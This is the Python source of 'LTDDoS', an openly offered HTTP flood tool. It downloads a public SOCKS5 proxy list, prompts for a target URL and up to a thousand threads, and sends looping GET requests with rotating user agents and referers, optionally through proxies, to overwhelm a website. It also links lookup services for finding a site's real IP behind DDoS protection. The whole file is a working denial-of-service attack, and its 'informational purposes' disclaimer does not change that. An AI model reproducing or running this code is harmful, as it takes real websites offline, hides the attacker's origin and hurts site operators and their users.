import requests
import os
import sys
import ctypes
from random import choice
import threading
import socket

ver = '1.2'
cwd = os.getcwd()
fos = sys.platform

par_stop = False

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

icon = resource_path("1.ico")
ua_txt = resource_path("ua.txt")
ref_txt = resource_path("referers.txt")
proxy_txt = resource_path("proxy.txt")

text = open(ua_txt, 'r').readlines()
ua = []
for line in text:
    ua.append(line.split())

textref = open(ref_txt, 'r').readlines()
ref = []
for line in textref:
    ref.append(line.split())

text_proxy = open(proxy_txt, 'wb')
try:
    r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt")
    text_proxy.write(r.content)
    text_proxy.close()
    text_proxy = open(proxy_txt,'r').readlines()
    proxy = []
    for line in text_proxy:
        proxy.append(line.split())
except:
    pass

print('[INFO] Check Proxy...')
proxy_valid = []

def check(p, i):
    try:
        requests.get('http://www.google.com', headers={"User-agent": 'Mozilla/5.0'}, proxies={'http': p}, timeout=5)
        proxy_valid.append(line.split())
        return
    except:
        return

try:
    c_proxy = open(proxy_txt, 'r').readlines()
    for line in c_proxy:
        proxy5 = str(line.split())
        proxy5 = proxy5.replace('[', '').replace(']', '').replace("'", '')
        prx = f'socks5://{proxy5}'
        threading.Thread(target=check, args=(prx, 1)).start()
except:
    pass

col_proxy = len(proxy)
col_valid_proxy = len(proxy_valid)

def VPN():
    print("""
██╗░░░░░████████╗██████╗░██████╗░░█████╗░░██████╗
██║░░░░░╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░██║░╚═══██╗
███████╗░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░

#################################################
#                coded by p1mpus                #
#        https://github.com/p1mpus/LTDDoS       #
#################################################

-------------------------------------------------------
[!] The author is not responsible for your actions!
[!] The program is provided for informational purposes.
-------------------------------------------------------
""")
    if (fos == 'linux'):
        response = requests.get('http://icanhazip.com/')
        print(f'Found proxy: {str(col_proxy)}\nValid proxy: {str(col_valid_proxy)}')
        print("Your IP: " + response.text)
        main()
    elif (fos == 'win32'):
        ctypes.windll.kernel32.SetConsoleTitleW(f'LTDDoS by p1mpus {ver}')
        response = requests.get('http://icanhazip.com/')
        print(f'Found proxy: {str(col_proxy)}\nValid proxy: {str(col_valid_proxy)}')
        print("Your IP: " + response.text)
        main()

def main():
    try:
        global url
        print('Example URL - https://google.com\nReal IP example - https://111.111.111.111')
        url = input("Write site URL: ")
        if (url == ''):
            VPN()
        else:
            pass

        global ip_url
        ip_url = url.replace('https://', '').replace('http://', '').replace('/', '')
        global ip
        ip = socket.gethostbyname(ip_url)

        try:
            host = socket.gethostbyaddr(ip)[0]
            print(f"\n[INFO] Information about the site ({url}):\n -> [*] IP: {str(ip)}\n -> [*] Host: {str(host)}")
        except:
            print(f"\n[INFO] Information about the site ({url}):\n -> [*] IP: {str(ip)}\n -> [!] Host: The host was not found, perhaps there is DDoS protection on the site! You can try to find the real IP or use BYPASS.")

        Real_IP()

        global thr
        thr = input("Write threads (recommended: 1000): ")
        if (thr == ''):
            thr = 1000
        else:
            thr = int(thr)

        prx = input('Use proxy? [Y/n]: ')
        if (prx == 'n'):
            prx = 'n'
        else:
            prx = 'y'

        start = input("Start attack? [y/n]: ")

        if (start == 'y'):
            global par_stop
            par_stop = False

            threading.Thread(target=STOP).start()
            if (prx == 'y'):
                print(f'\nAttack GET-Proxy (threads: {str(thr)}) to {url}!\n[INFO] Checking the availability of the site: https://check-host.net/check-http?host={url}\n\n[Press [ENTER] to stop]')
                for i in range(thr):
                    threading.Thread(target=GET_PROXY).start()
            else:
                print(f'\nAttack GET (threads: {str(thr)}) to {url}!\n[INFO] Checking the availability of the site: https://check-host.net/check-http?host={url}\n\n[Press [ENTER] to stop]')
                for i in range(thr):
                    threading.Thread(target=GET).start()
        elif (start == 'n'):
            VPN()
        else:
            print('ERROR!')
            VPN()
    except:
        print('ERROR!')
        VPN()

def STOP():
    input()
    global par_stop
    par_stop = True
    VPN()

def Real_IP():
    try:
        print('\n[INFO] Additional information about the site:')
        print(f' -> [*] Report Site Info: https://check-host.net/ip-info?host={ip_url}')
        print(f' -> [*] Report IP history: https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q={ip_url}')
        print(f' -> [*] Report IP: https://www.criminalip.io/en/asset/search?query={ip_url}')
        print('')
    except:
        pass

def GET():
    while True:
        if (par_stop == False):
            try:
                user_agent = choice(ua)
                user_agent = str(user_agent)
                user_agent = user_agent.replace('[', '').replace(']', '').replace("'", '')

                referers = choice(ref)
                referers = str(referers)
                referers = referers.replace('[', '').replace(']', '').replace("'", '')

                headers = {
                "User-Agent": user_agent,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": referers,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
                }

                requests.get(url, headers=headers)
            except:
                pass
        else:
            return
        
def GET_PROXY():
    while True:
        if (par_stop == False):
            try:
                user_agent = choice(ua)
                user_agent = str(user_agent)
                user_agent = user_agent.replace('[', '').replace(']', '').replace("'", '')

                referers = choice(ref)
                referers = str(referers)
                referers = referers.replace('[', '').replace(']', '').replace("'", '')

                headers = {
                "User-Agent": user_agent,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": referers,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
                }

                proxy5 = choice(proxy_valid)
                proxy5 = str(proxy5)
                proxy5 = proxy5.replace('[', '').replace(']', '').replace("'", '')
                prx = f'socks5://{proxy5}'

                requests.get(url, headers=headers, proxies={'http': prx})
            except:
                pass
        else:
            return
VPN()